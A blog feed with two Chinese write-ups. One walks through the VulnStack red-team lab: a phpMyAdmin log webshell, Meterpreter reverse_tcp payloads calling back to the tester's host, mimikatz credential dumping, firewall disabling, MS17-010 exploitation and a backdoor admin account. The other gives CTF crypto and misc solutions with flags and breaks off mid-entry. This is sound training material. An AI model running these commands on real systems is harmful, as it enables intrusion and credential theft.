    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/#base">漏洞详情 (qiyuanxuetang.net)</a></p><p>Web服务器：Windows7（配有phpstudy，需要自启）（网络配置：仅主机+NAT）</p><p>域内主机：Win2K3 Metasploitable（启动时，vm tools出现提示，不用管，全部否或关掉）（网络配置：仅主机）</p><p>域控：Windows 2008（网络配置：仅主机）</p><p>默认密码均为：hongrisec@2019，修改密码自定</p><p>Windows7：192.168.232.132  192.168.52.143</p><p>Windows server 2008 : 192.168.52.138</p><p>Win2K3 Metasploitable : 192.168.52.141</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>发现Win7外网ip</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607203834206.png" alt="image-20240607203834206"></p><p>扫描ip，发现有关端口</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607203858402.png" alt="image-20240607203858402"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><h2 id="phpmyadmin注马"><a href="#phpmyadmin注马" class="headerlink" title="phpmyadmin注马"></a>phpmyadmin注马</h2><p>访问80端口</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607204449840.png" alt="image-20240607204449840"></p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607214350486.png" alt="image-20240607214350486"></p><p>数据库密码为root，mysql远程连不上<img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607214618332.png" alt="image-20240607214618332"></p><p>扫描目录发现，/phpmyadmin</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607205213977.png" alt="image-20240607205213977"></p><p>登录得到</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607214802116.png" alt="image-20240607214802116"></p><p>phpmyadmin后台getshell的常用手段有以下几种方式：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1</span>、<span class="hljs-keyword">select</span> <span class="hljs-keyword">into</span> outfile直接写入<br><span class="hljs-number">2</span>、开启全局日志getshell<br><span class="hljs-number">3</span>、使用慢查询日志getsehll<br><span class="hljs-number">4</span>、使用错误日志getshell<br><span class="hljs-number">5</span>、利用phpmyadmin4<span class="hljs-number">.8</span>.x本地文件包含漏洞getshell<br></code></pre></td></tr></table></figure><p>执行sql语句</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607225303935.png" alt="image-20240607225303935"></p><p>发现没有写入权限，无法用select into outfile方法写入shell,只能使用第二种方法</p><p>开启日志功能</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log</span>=<span class="hljs-string">&#x27;on&#x27;</span>;<br></code></pre></td></tr></table></figure><p>修改日志保存路径为<code>C:/phpStudy/WWW/shell.php</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></code></pre></td></tr></table></figure><p>修改成功</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607230543202.png" alt="image-20240607230543202"></p><p>注马</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">SELECT &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br></code></pre></td></tr></table></figure><p>蚁剑成功连接</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240608103504691.png" alt="image-20240608103504691"></p><p>连接后发现还有个yxcms，这里看到有师傅是直接通过cms来getshell，但是我没扫出来yxcms的目录，但是扫出来cms的压缩包，下载解压可以得到，于是猜测还有yxcms,另外数据库里有个newyxcms,去尝试猜也可能得到。</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240607220357338.png" alt="image-20240607220357338"></p><h2 id="yxcms注马"><a href="#yxcms注马" class="headerlink" title="yxcms注马"></a>yxcms注马</h2><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240608112001809.png" alt="image-20240608112001809"></p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240608104001172.png" alt="image-20240608104001172"></p><p>现在要找到acomment.php，可以通过目录遍历，但是这里建议直接通过之前的cms压缩包解压出来直接搜索</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240608111944345.png" alt="image-20240608111944345"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>蚁剑虚拟终端ipconfig查看</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923110315192.png" alt="image-20240923110315192"></p><p>发现内网c段</p><h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><p>Cobalt Strike设置监听端口</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923172425918.png" alt="image-20240923172425918"></p><p>上传木马</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923173509196.png" alt="image-20240923173509196"></p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923173529518.png" alt="image-20240923173529518"></p><p>进行提权</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923200402756.png" alt="image-20240923200402756"></p><p>得到system权限</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923200610165.png" alt="image-20240923200610165"></p><p>执行net view查看域控主机</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923201104035.png" alt="image-20240923201104035"></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">查看防火墙状态<br>shell netsh firewall show <span class="hljs-keyword">state</span><br><span class="hljs-comment"># 关闭防火墙 </span><br>shell netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">mimikatz sekurlsa::logonpasswords  <span class="hljs-meta">#获取密码</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923202816670.png" alt="image-20240923202816670"></p><p>成功控制 Windows server 2008</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923203217735.png" alt="image-20240923203217735"></p><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>kali生成msf木马，蚁剑上传</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.232.134 <span class="hljs-attribute">LPORT</span>=4444 -f exe -o msf.exe<br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.232.134</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4444</span> <br>run<br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923215211366.png" alt="image-20240923215211366"></p><p>执行<code>getuid</code>查看当前权限，然后<code>getsystem</code>提为system权限</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923215503247.png" alt="image-20240923215503247"></p><p>查看端口，发现没有开启3389端口</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923215711180.png" alt="image-20240923215711180"></p><p>执行<code>run post/windows/manage/enable_rdp</code>开启3389端口</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923215753637.png" alt="image-20240923215753637"></p><p>kali执行命令<code>rdesktop 192.168.232.132</code></p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923215951985.png" alt="image-20240923215951985"></p><p>执行<code>load mimikatz</code>，发现只能用kiwi</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923221918780.png" alt="image-20240923221918780"></p><p>查看靶机是64位还是32位</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923222109516.png" alt="image-20240923222109516"></p><p>执行<code>migrate  488</code>，迁移进程</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">creds_all</span>  <span class="hljs-comment">#列举所有凭据</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923222404162.png" alt="image-20240923222404162"></p><p>得到密码，即可远程登录</p><p><code>run post/windows/gather/enum_applications</code>查看win7上安装了哪些软件</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240923223526795.png" alt="image-20240923223526795"></p><p><code>arp -a</code>查看路由表，发现域内主机</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240924163524009.png" alt="image-20240924163524009"></p><p><code>run autoroute -s 192.168.52.0/24</code>添加录路由；</p><p><code>run autoroute -p</code>查看路由；</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20240924163633397.png" alt="image-20240924163633397"></p><p>设置代理</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> srvhost <span class="hljs-comment">192.168.232.134</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">srvport 1080</span><br>run<br></code></pre></td></tr></table></figure><p>修改 /etc/proxychains4.conf ,最后一行改为socks4 192.168.232.134 1080</p><p>这里没显示连接失败，但代理能访问</p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241013220154092.png" alt="image-20241013220154092"></p><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241013220208178.png" alt="image-20241013220208178"></p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>扫描系统版本，是Windows2003</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_version<br><span class="hljs-keyword">set</span> rhosts 192.168.52.141<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241014161935857.png" alt="image-20241014161935857"></p><p>验证发现存在永恒之蓝漏洞；</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-keyword">set</span> rhost 192.168.52.141<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241014162213295.png" alt="image-20241014162213295"></p><p><code>exploit/windows/smb/ms17_010_eternalblue</code>打不了，但是可以使用<br><code>auxiliary/admin/smb/ms17_010_command</code>模块执行命令；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/ms17_010_command<br><span class="hljs-built_in">set</span> rhosts 192.168.52.141<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> <span class="hljs-built_in">whoami</span><br>run<br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241014162230872.png" alt="image-20241014162230872"></p><p>远程登录</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net user blckder02 8888! <span class="hljs-string">/add</span>  <span class="hljs-comment">#添加用户；</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net localgroup administrators blckder02 <span class="hljs-string">/add</span>  <span class="hljs-comment">#添加管理员权限；</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-string">/v</span> fDenyTSConnections <span class="hljs-string">/t</span> REG_DWORD <span class="hljs-string">/d</span> 00000000 <span class="hljs-string">/f</span>&#x27;  <span class="hljs-comment">#执行命令开启3389端口，这里要么用单引号把命令引住，要么用反斜杠对反斜杠和引号进行转义，否则会出错；</span><br>run<br>proxychains rdesktop 192.168.52.141  <span class="hljs-comment">#远程桌面连接成功，可以用添加的用户进行登录；</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241014164211502.png" alt="image-20241014164211502"></p><p>反弹shell</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/ms17_010_psexec<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.52.141</span><br>run<br></code></pre></td></tr></table></figure><p><img src="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/image-20241014165413031.png" alt="image-20241014165413031"></p><p>这里可能是之前代理的问题，都没有成功</p><p>另一个靶机同理</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/10076?time__1311=mq%2BxBD9QDQe8D%2FFi4BKkPWw2DIxYqD%3D1O4D&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-1">ATT&amp;CK实战系列——红队实战(一) - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/weixin_54902210/article/details/124329382">[内网渗透]——VulnStack (一)_vulnstack一-CSDN博客</a></p><p><a href="https://www.cnblogs.com/carmi/p/17666712.html">VulnStack - ATT&amp;CK红队评估实战(一) Writeup - gcc_com - 博客园 (cnblogs.com)</a></p><p><a href="https://lca.xlog.app/ATTCK-hong-dui-ping-gu-shi-zhan-ba-chang--1?locale=zh">ATT&amp;CK红队评估实战靶场-1 - lca (xlog.app)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn2024</title>
    <link href="/2024/05/18/ciscn2024/"/>
    <url>/2024/05/18/ciscn2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="OvO"><a href="#OvO" class="headerlink" title="OvO"></a>OvO</h2><script type="math/tex; mode=display">e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1</script><script type="math/tex; mode=display">e = 65537 + kk * p + (kk+2) * ((p+1) * (q+1)) + 1</script><script type="math/tex; mode=display">e = 65537 + kk * p + (kk+2) *n+(kk+2) * p+(kk+2)  * q + 1</script><p>因为k为128位，p,q为512位，e近似（kk+2）*n,所以</p><script type="math/tex; mode=display">k=e//n-2</script><p>等式两边同乘以p</p><script type="math/tex; mode=display">e*p = 65537*p + kk * p^2 + (kk+2) *n*p+(kk+2) * p^2+(kk+2)  * n + p</script><p>所以存在</p><script type="math/tex; mode=display">e_h*p_h = 65537*p_h + kk * n + (kk+2) *n*p_h+(kk+2) * n+(kk+2)  * p_h^2 + p_h</script><p>解方程可得到p的高位，然后就是已知p的高位求解，直接套板子</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import * <br> <br><span class="hljs-attribute">n</span> = <span class="hljs-number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span><br><span class="hljs-attribute">c</span> = <span class="hljs-number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span><br><br><span class="hljs-attribute">k</span> = e // n - <span class="hljs-number">2</span> <br><br><span class="hljs-attribute">R</span>.&lt;x&gt; = PolynomialRing(RealField(<span class="hljs-number">1024</span>)) <br><br><span class="hljs-attribute">f</span>=e*x-(<span class="hljs-number">65538</span>*x+k*x^<span class="hljs-number">2</span>+(k+<span class="hljs-number">2</span>)*n*x+(k+<span class="hljs-number">2</span>)*x^<span class="hljs-number">2</span>+(k+<span class="hljs-number">2</span>)*n)<br><br><span class="hljs-attribute">res</span> = f.roots() <br> <br><span class="hljs-attribute">for</span> i in res: <br>    <span class="hljs-attribute">p_h</span> = int(i[<span class="hljs-number">0</span>]) <br>    <span class="hljs-attribute">PR</span>.&lt;x&gt; = PolynomialRing(Zmod(n)) <br>    <span class="hljs-attribute">f1</span> = x + p_h<br>    <span class="hljs-attribute">roots</span> = f1.monic().small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">200</span>,beta=<span class="hljs-number">0</span>.<span class="hljs-number">4</span>) <br>    <span class="hljs-attribute">if</span> roots: <br>        <span class="hljs-attribute">p</span> = int(roots[<span class="hljs-number">0</span>]) + p_h<br>        <span class="hljs-comment">#print(p,n%p)</span><br>        <span class="hljs-attribute">if</span> p and n%p==<span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">q</span>= n // p<br>            <span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span> + k * p + (k+<span class="hljs-number">2</span>) * ((p+<span class="hljs-number">1</span>) * (q+<span class="hljs-number">1</span>)) + <span class="hljs-number">1</span> <br>            <span class="hljs-attribute">d</span> = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)) <br>            <span class="hljs-attribute">m</span> = pow(c,d,n) <br>            <span class="hljs-attribute">print</span>(long_to_bytes(int(m)))<br>            <br><span class="hljs-comment">#b&#x27;flag&#123;b5f771c6-18df-49a9-9d6d-ee7804f5416c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><p>Atbash+base64+栅栏</p><img src="/2024/05/18/ciscn2024/image-20240519105742144.png" class title="image-20240519105742144"><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="神秘文件"><a href="#神秘文件" class="headerlink" title="神秘文件"></a>神秘文件</h2><h3 id="Part1-flag-e"><a href="#Part1-flag-e" class="headerlink" title="Part1:flag{e"></a>Part1:flag{e</h3><p>docx文件里Bifid cipher加base64</p><img src="/2024/05/18/ciscn2024/image-20240518213124567.png" class title="image-20240518213124567"><h3 id="part2-675efb"><a href="#part2-675efb" class="headerlink" title="part2:675efb"></a>part2:675efb</h3><p>改成压缩包后得到docx，再改后缀为zip，发现</p><img src="/2024/05/18/ciscn2024/image-20240518211420871.png" class title="image-20240518211420871"><img src="/2024/05/18/ciscn2024/image-20240518211327277.png" class title="image-20240518211327277"><h3 id="PArt3-3-34"><a href="#PArt3-3-34" class="headerlink" title="PArt3:3-34"></a>PArt3:3-34</h3><p>bin文件010分析，rc4、base64解码</p><img src="/2024/05/18/ciscn2024/image-20240518210645246.png" class title="image-20240518210645246"><h3 id="Payt4-6f-40"><a href="#Payt4-6f-40" class="headerlink" title="Payt4:6f-40"></a>Payt4:6f-40</h3><p>ppt里发现</p><img src="/2024/05/18/ciscn2024/image-20240518210043082.png" class title="image-20240518210043082"><h3 id="pArt5-5f-90d"><a href="#pArt5-5f-90d" class="headerlink" title="pArt5:5f-90d"></a>pArt5:5f-90d</h3><p>6轮base64</p><img src="/2024/05/18/ciscn2024/image-20240518210256516.png" class title="image-20240518210256516"><h3 id="ParT6-d-2"><a href="#ParT6-d-2" class="headerlink" title="ParT6:d-2"></a>ParT6:d-2</h3><p>改成zip发现未显示图片</p><img src="/2024/05/18/ciscn2024/image-20240518205728241.png" class title="image-20240518205728241"><h3 id="PART7-22b3"><a href="#PART7-22b3" class="headerlink" title="PART7=22b3"></a>PART7=22b3</h3><p>rot13解密</p><img src="/2024/05/18/ciscn2024/image-20240518213516223.png" class title="image-20240518213516223"><h3 id="paRt8-87e"><a href="#paRt8-87e" class="headerlink" title="paRt8:87e"></a>paRt8:87e</h3><p>根据下面提示去掉B、b、1、3，再base64解密</p><img src="/2024/05/18/ciscn2024/image-20240518211705339.png" class title="image-20240518211705339"><h3 